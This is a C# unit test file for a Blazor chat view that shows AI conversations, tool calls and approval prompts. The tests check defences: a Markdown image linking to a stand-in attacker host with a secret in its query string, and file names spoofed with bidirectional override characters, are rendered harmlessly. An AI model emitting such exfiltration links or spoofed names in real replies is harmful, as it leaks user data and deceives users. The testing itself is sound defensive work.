using System.Globalization;
using Bunit;
using Microsoft.Extensions.AI;
using Polhem.Chat.UnitTests;
using static Polhem.Chat.UnitTests.ScriptedChatClient;

namespace Polhem.Chat.Blazor.UnitTests;

/// <summary>The view shows the conversation: prompts, streamed replies, activity, approvals and summaries.</summary>
public class ChatViewTests : BunitContext
{
    private const string ModulePath = "./_content/Polhem.Chat.Blazor/polhem-chat.js";

    private static readonly byte[] s_png = Convert.FromBase64String(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==");

    private readonly BunitJSModuleInterop _module;

    public ChatViewTests()
    {
        JSInterop.Mode = JSRuntimeMode.Loose;
        _module = JSInterop.SetupModule(ModulePath);
    }

    private static ChatResponseUpdate Update(params AIContent[] contents) => new(ChatRole.Assistant, [.. contents]);

    private IRenderedComponent<ChatView> HostDriven(ChatConversation conversation, bool showsActivity = false) =>
        Render<ChatView>(parameters => parameters
            .Add(view => view.Conversation, conversation)
            .Add(view => view.ShowsActivity, showsActivity)
            .Add(view => view.Strings, new ChatStrings()));

    [Fact(DisplayName = "A prompt sent through the runner shows with its reply as Markdown and the turn's summary")]
    public async Task Runner_ShowsPromptReplyAndSummary()
    {
        var runner = new ChatRunner(new ScriptedChatClient(Text("Hello **world**")));
        var view = Render<ChatView>(parameters => parameters.Add(v => v.Runner, runner).Add(v => v.Strings, new ChatStrings()));

        await view.InvokeAsync(() => runner.SendAsync("Hi"));

        view.WaitForAssertion(() =>
        {
            Assert.Equal("Hi", view.Find(".pch-prompt-text").TextContent);
            Assert.Equal("world", view.Find(".pch-reply strong").TextContent);
            Assert.Contains(" s", view.Find(".pch-summary").TextContent, StringComparison.Ordinal);
        });
    }

    [Fact(DisplayName = "A reply shows as it streams, and its copy button appears once it is complete")]
    public async Task Runner_ReplyStreams()
    {
        var pause = new Pause();
        var runner = new ChatRunner(new ScriptedChatClient(Text("Hel"), pause, Text("lo")));
        var view = Render<ChatView>(parameters => parameters.Add(v => v.Runner, runner).Add(v => v.Strings, new ChatStrings()));

        var sending = view.InvokeAsync(() => runner.SendAsync("Hi"));
        await pause.Reached.Task;
        view.WaitForAssertion(() => Assert.Equal("Hel", view.Find(".pch-reply .pmd").TextContent.Trim()));
        Assert.Empty(view.FindAll(".pch-copy"));

        pause.Release.SetResult();
        await sending;
        view.WaitForAssertion(() =>
        {
            Assert.Equal("Hello", view.Find(".pch-reply .pmd").TextContent.Trim());
            Assert.Single(view.FindAll(".pch-copy"));
        });
    }

    [Fact(DisplayName = "Reasoning and tool calls are hidden by default and shown with ShowsActivity")]
    public void Activity_HiddenUnlessShown()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Weather?");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextReasoningContent("Look it up."), new FunctionCallContent("c1", "weather", new Dictionary<string, object?> { ["city"] = "Taipei" })));
        turn.Apply(new ChatResponseUpdate(ChatRole.Tool, [new FunctionResultContent("c1", "Sunny")]));
        turn.Apply(Update(new TextContent("Sunny.")));
        turn.Complete();

        var hidden = HostDriven(conversation);
        Assert.Empty(hidden.FindAll(".pch-reasoning"));
        Assert.Empty(hidden.FindAll(".pch-tool-call"));

        var shown = HostDriven(conversation, showsActivity: true);
        Assert.Equal("Reasoning", shown.Find(".pch-reasoning summary").TextContent);
        Assert.Equal("weather", shown.Find(".pch-tool-title").TextContent);
        Assert.Equal(new ChatStrings().ToolCompleted, shown.Find(".pch-tool-status").TextContent);
        Assert.Contains("city: Taipei", shown.Find(".pch-tool-call .pch-card-body").TextContent, StringComparison.Ordinal);
    }

    [Fact(DisplayName = "A call that waits for approval shows even with the activity hidden, with every character of its arguments visible")]
    public void Approval_ShowsArgumentsAndApproves()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Clean up");
        var turn = conversation.BeginTurn();
        var call = new FunctionCallContent("c1", "delete", new Dictionary<string, object?> { ["path"] = "notes\u202Etxt.exe" });
        turn.Apply(Update(new ToolApprovalRequestContent("r1", call)));
        var view = HostDriven(conversation);

        var arguments = view.Find(".pch-approval-args").TextContent;
        Assert.Contains("\\u{202E}", arguments, StringComparison.Ordinal);
        Assert.DoesNotContain("\u202E", arguments, StringComparison.Ordinal);

        view.Find(".pch-approve").Click();

        var entry = conversation.Entries.OfType<ToolCallEntry>().Single();
        Assert.Equal(ToolCallStatus.Running, entry.Status);
        view.WaitForAssertion(() => Assert.Empty(view.FindAll(".pch-approval")));
    }

    [Fact(DisplayName = "A double click on Approve, before the card redraws, approves once and does not fail")]
    public void Approval_DoubleClick()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Clean up");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new ToolApprovalRequestContent("r1", new FunctionCallContent("c1", "delete"))));
        var view = HostDriven(conversation, showsActivity: true);
        var approve = view.Find(".pch-approve");
        var reject = view.Find(".pch-reject");

        approve.Click();
        approve.Click();
        reject.Click();

        Assert.Equal(ToolCallStatus.Running, conversation.Entries.OfType<ToolCallEntry>().Single().Status);
    }

    [Fact(DisplayName = "An image in a reply loads nothing by default, and loads when the application's options allow it")]
    public void Reply_Images_OffByDefault()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextContent("![chart](https://evil.example/p?secret=42)")));
        turn.Complete();

        var view = HostDriven(conversation);
        Assert.Empty(view.FindAll(".pch-reply img"));
        Assert.Contains("chart", view.Find(".pch-reply").TextContent, StringComparison.Ordinal);

        view.Render(parameters => parameters.Add(v => v.MarkdownOptions, new Polhem.Markdown.MarkdownOptions()));
        Assert.Equal("https://evil.example/p?secret=42", view.Find(".pch-reply img").GetAttribute("src"));
    }

    [Fact(DisplayName = "A bidirectional override in a reply shows as an escape in text, inline code and code blocks, and Hebrew shows as it is")]
    public void Reply_BidiOverride_ShowsAsEscape()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextContent("Deleted report\u202Efdp.exe and `inline\u2067code`.\n\n```\nblock\u202Dcode\n```\n\nשלום עולם")));
        turn.Complete();

        var view = HostDriven(conversation);
        var text = view.Find(".pch-reply .pmd").TextContent;

        Assert.Contains("report\\u{202E}fdp.exe", text, StringComparison.Ordinal);
        Assert.Contains("inline\\u{2067}code", view.Find(".pch-reply code").TextContent, StringComparison.Ordinal);
        Assert.Contains("block\\u{202D}code", view.Find(".pch-reply pre").TextContent, StringComparison.Ordinal);
        Assert.Contains("שלום עולם", text, StringComparison.Ordinal);
        Assert.DoesNotContain("\u202E", text, StringComparison.Ordinal);
        Assert.DoesNotContain("\u2067", text, StringComparison.Ordinal);
        Assert.DoesNotContain("\u202D", text, StringComparison.Ordinal);
    }

    [Fact(DisplayName = "A character reference to a bidirectional override in a reply, in text or in HTML, shows as an escape")]
    public void Reply_BidiReference_ShowsAsEscape()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextContent("Deleted report&#x202E;fdp.exe and <span>memo&#8238;txt.exe</span>")));
        turn.Complete();

        var text = HostDriven(conversation).Find(".pch-reply .pmd").TextContent;

        Assert.Contains("report\\u{202E}fdp.exe", text, StringComparison.Ordinal);
        Assert.Contains("memo\\u{202E}txt.exe", text, StringComparison.Ordinal);
        Assert.DoesNotContain("\u202E", text, StringComparison.Ordinal);
    }

    [Fact(DisplayName = "A bidirectional override in the reasoning shows as an escape")]
    public void Reasoning_BidiOverride_ShowsAsEscape()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextReasoningContent("Open report\u202Efdp.exe")));
        turn.Complete();

        Assert.Equal("Open report\\u{202E}fdp.exe", HostDriven(conversation, showsActivity: true).Find(".pch-reasoning .pch-card-body").TextContent);
    }

    [Fact(DisplayName = "Rejecting a call that waits for approval rejects it")]
    public void Approval_Rejects()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Clean up");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new ToolApprovalRequestContent("r1", new FunctionCallContent("c1", "delete"))));
        var view = HostDriven(conversation);

        view.Find(".pch-reject").Click();

        Assert.Equal(ToolCallStatus.Rejected, conversation.Entries.OfType<ToolCallEntry>().Single().Status);
    }

    [Fact(DisplayName = "A picture within the limits shows as a preview, and one that declares too many pixels shows as its name")]
    public void Attachments_PreviewOnlySafePictures()
    {
        var huge = (byte[])s_png.Clone();
        System.Buffers.Binary.BinaryPrimitives.WriteInt32BigEndian(huge.AsSpan(16), 12000);
        System.Buffers.Binary.BinaryPrimitives.WriteInt32BigEndian(huge.AsSpan(20), 12000);
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Two pictures",
        [
            new DataContent(s_png, ChatAttachmentLimits.Png) { Name = "small.png" },
            new DataContent(huge, ChatAttachmentLimits.Png) { Name = "huge.png" },
        ]);

        var view = HostDriven(conversation);

        var preview = Assert.Single(view.FindAll(".pch-thumbnail"));
        Assert.StartsWith("data:image/png;base64,", preview.GetAttribute("src"), StringComparison.Ordinal);
        Assert.Equal("huge.png", view.Find(".pch-file-name").TextContent);
    }

    [Fact(DisplayName = "The copy button of a finished reply copies its Markdown")]
    public void Copy_CopiesMarkdown()
    {
        _module.Setup<bool>("copyText", "Hello **world**").SetResult(true);
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextContent("Hello **world**")));
        turn.Complete();
        var view = HostDriven(conversation);
        // The view copies through its script, which is ready once it has started following the conversation.
        view.WaitForAssertion(() => _module.VerifyInvoke("follow"));

        view.Find(".pch-copy").Click();

        view.WaitForAssertion(() => _module.VerifyInvoke("copyText"));
    }

    [Fact(DisplayName = "New texts apply to the entries already shown")]
    public void Strings_ChangeRedrawsEntries()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new TextContent("Hello")));
        turn.Complete();
        var view = HostDriven(conversation);
        Assert.DoesNotContain("秒", view.Find(".pch-summary").TextContent, StringComparison.Ordinal);

        view.Render(parameters => parameters.Add(v => v.Strings, ChatStrings.ForCulture(CultureInfo.GetCultureInfo("zh-TW"))));

        Assert.Contains("秒", view.Find(".pch-summary").TextContent, StringComparison.Ordinal);
    }

    [Fact(DisplayName = "Another conversation replaces the one shown")]
    public void Conversation_Replaced()
    {
        var first = new ChatConversation();
        first.AddUserPrompt("First");
        var second = new ChatConversation();
        second.AddUserPrompt("Second");
        var view = HostDriven(first);

        view.Render(parameters => parameters.Add(v => v.Conversation, second));

        Assert.Equal("Second", view.Find(".pch-prompt-text").TextContent);
        first.AddUserPrompt("Ignored");
        Assert.Single(view.FindAll(".pch-prompt"));
    }

    [Fact(DisplayName = "An error and the turn's failure show, and an entry type of the application's own shows nothing")]
    public void Error_AndOwnEntryType()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        var turn = conversation.BeginTurn();
        turn.Fail(new InvalidOperationException("The model is down."));
        conversation.Entries.Add(new NoteEntry());

        var view = HostDriven(conversation);

        Assert.Contains("The model is down.", view.Find(".pch-error").TextContent, StringComparison.Ordinal);
        Assert.Equal(new ChatStrings().TurnFailed, view.Find(".pch-summary").TextContent.Split(" · ")[^1]);
        Assert.Equal(conversation.Entries.Count - 1, view.FindAll(".pch-entries > *").Count);
    }

    [Fact(DisplayName = "A reply waiting for its first text says the model is thinking, and a stopped one says it was stopped")]
    public void Reply_ThinkingAndStopped()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        conversation.Entries.Add(new AssistantReplyEntry(isStreaming: true));
        var view = HostDriven(conversation);
        Assert.Equal("Thinking…", view.Find(".pch-thinking").TextContent);

        var stopped = new ChatConversation();
        stopped.AddUserPrompt("Hi");
        var turn = stopped.BeginTurn();
        turn.Apply(Update(new TextContent("Partial")));
        turn.Stop();
        var stoppedView = HostDriven(stopped);
        Assert.Equal(new ChatStrings().Stopped, stoppedView.Find(".pch-stopped").TextContent);
    }

    [Fact(DisplayName = "A failed call shows its error, and a rejected one the reason, with hidden characters escaped")]
    public void ToolCall_FailedAndRejected()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Go");
        var turn = conversation.BeginTurn();
        turn.Apply(Update(new FunctionCallContent("c1", "fetch")));
        turn.Apply(new ChatResponseUpdate(ChatRole.Tool, [new FunctionResultContent("c1", null) { Exception = new IOException("Timed out.") }]));
        turn.Apply(Update(new ToolApprovalRequestContent("r2", new FunctionCallContent("c2", "delete"))));
        turn.Reject(conversation.Entries.OfType<ToolCallEntry>().Last(), "Not \u202E now");

        var view = HostDriven(conversation, showsActivity: true);

        Assert.Contains("Timed out.", view.Find(".pch-error-text").TextContent, StringComparison.Ordinal);
        Assert.Equal("Not \\u{202E} now", view.Find(".pch-muted").TextContent);
    }

    [Fact(DisplayName = "Entries leave the view when the last prompt is rewound or the conversation is cleared")]
    public void Entries_RewoundAndCleared()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("First");
        conversation.AddUserPrompt("Second");
        var view = HostDriven(conversation);
        Assert.Equal(2, view.FindAll(".pch-prompt").Count);

        conversation.RewindLastPrompt();
        view.WaitForAssertion(() => Assert.Equal("First", Assert.Single(view.FindAll(".pch-prompt-text")).TextContent));

        conversation.Clear();
        view.WaitForAssertion(() => Assert.Empty(view.FindAll(".pch-prompt")));
        conversation.AddUserPrompt("Again");
        view.WaitForAssertion(() => Assert.Equal("Again", view.Find(".pch-prompt-text").TextContent));
    }

    [Fact(DisplayName = "A view disposed after its circuit went away does not fail, and still leaves no handler behind")]
    public async Task Dispose_AfterDisconnect()
    {
        _module.SetupVoid("unwatch", _ => true).SetException(new Microsoft.JSInterop.JSDisconnectedException("The circuit is gone."));
        var conversation = new ChatConversation();
        var view = HostDriven(conversation);
        // The view calls its script once the script has loaded; the last call it makes then is to watch the prompt box.
        view.WaitForAssertion(() => _module.VerifyInvoke("watchPrompt"));

        await DisposeComponentsAsync();

        _module.VerifyInvoke("unwatch");
        Assert.Empty(Handlers(conversation.Entries, "CollectionChanged"));
    }

    private sealed class NoteEntry : ChatEntry;

    [Fact(DisplayName = "A disposed view leaves no handler on the conversation or its entries")]
    public async Task Dispose_RemovesHandlers()
    {
        var conversation = new ChatConversation();
        conversation.AddUserPrompt("Hi");
        HostDriven(conversation);
        Assert.NotEmpty(Handlers(conversation.Entries, "CollectionChanged"));
        Assert.NotEmpty(Handlers(conversation.Entries[0], "PropertyChanged"));

        await DisposeComponentsAsync();

        Assert.Empty(Handlers(conversation.Entries, "CollectionChanged"));
        Assert.Empty(Handlers(conversation.Entries[0], "PropertyChanged"));
    }

    // The delegates behind an event, read from its backing field.
    private static Delegate[] Handlers(object source, string eventName)
    {
        for (var type = source.GetType(); type is not null; type = type.BaseType)
        {
            var field = type.GetField(eventName, System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            if (field is not null)
            {
                return (field.GetValue(source) as Delegate)?.GetInvocationList() ?? [];
            }
        }
        throw new InvalidOperationException($"{source.GetType()} has no field behind {eventName}.");
    }
}
